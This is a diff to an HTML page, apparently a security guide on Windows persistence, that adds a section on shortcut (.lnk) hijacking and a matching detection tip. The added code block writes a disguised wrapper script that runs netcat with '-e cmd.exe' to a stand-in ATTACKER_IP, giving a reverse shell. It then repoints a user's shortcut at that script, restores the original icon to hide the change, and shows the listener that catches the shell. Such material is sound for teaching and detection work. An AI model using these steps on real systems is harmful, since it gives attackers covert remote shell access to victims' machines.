@@ -130,7 +130,36 @@ schtasks /create /tn Updater /tr "C:\...\x.exe" /sc onlogon /ru SYSTEM          
           <li><strong>COM hijacking</strong> — pointing a frequently-instantiated CLSID under the per-user class store at an attacker DLL (no admin needed).</li>
           <li><strong>Service / task binary replacement</strong> — overwriting a binary a privileged task already runs (overlaps with weak-permission privesc).</li>
           <li><strong>Phantom DLLs</strong> — supplying a DLL a service looks for but does not ship.</li>
+          <li><strong>Shortcut (.lnk) hijacking</strong> — repointing a shortcut the user already clicks at a wrapper that runs your payload and then the real program (below).</li>
         </ul>
+
+        <h2>Shortcut (.lnk) hijacking</h2>
+        <p>
+          A shortcut the victim already clicks — on the desktop, the taskbar, or in the
+          Start menu — is a quiet trigger. Instead of pointing at the expected executable,
+          repoint its <em>Target</em> at a small wrapper that launches your implant and
+          then starts the real program, so the user sees exactly what they expected. No Run
+          key, no new task — just an edited <code>.lnk</code>, and it needs no admin when the
+          shortcut lives in the user's own profile.
+        </p>
+        <pre><code># 1) a wrapper script, hidden somewhere plausible (e.g. C:\Windows\System32\backdoor.ps1):
+#    fire the implant, then launch the real target so nothing looks off to the user:
+Start-Process -NoNewWindow "C:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
+C:\Windows\System32\calc.exe           # the program the shortcut claimed to open
+
+# 2) repoint the shortcut's Target at the wrapper, run hidden so no window lingers:
+powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
+#    then reset the shortcut's Icon back to the original .exe so it looks unchanged.
+
+# 3) catch it on the attacker box:
+nc -lvp 4445
+# the user gets their calculator; you get the shell. A console window may flash briefly.</code></pre>
+        <p>
+          The trade-off: it only fires when the user clicks that shortcut, and the brief
+          console flash (mitigated with <code>-WindowStyle hidden</code>) is the tell. It
+          pairs naturally with the Startup-folder technique above, where the planted item
+          <em>is</em> a shortcut.
+        </p>
 
         <h2>Accessibility &amp; account backdoors</h2>
         <ul>
@@ -150,6 +179,7 @@ schtasks /create /tn Updater /tr "C:\...\x.exe" /sc onlogon /ru SYSTEM          
         <ul>
           <li>Baseline autoruns (Sysinternals Autoruns) and alert on new Run keys, services, scheduled tasks and WMI subscriptions (Sysmon 12&ndash;13, 19&ndash;21 &mdash; see <a href="2026-10-09-logging-and-telemetry.html">Logging</a>).</li>
           <li>Watch for DLLs loading from user-writable paths and unusual per-user CLSID writes.</li>
+          <li>Baseline shortcut (.lnk) targets and flag ones whose target/arguments are powershell/cmd/wscript rather than the app they claim to launch (Sysmon EID 1 on the interpreter the shortcut spawns).</li>
           <li>Application allow-listing (<a href="2026-10-08-applocker-bypass.html">AppLocker/WDAC</a>) limits what a persisted payload can run.</li>
           <li>Alert on accessibility-binary tampering and IFEO debugger values.</li>
         </ul>
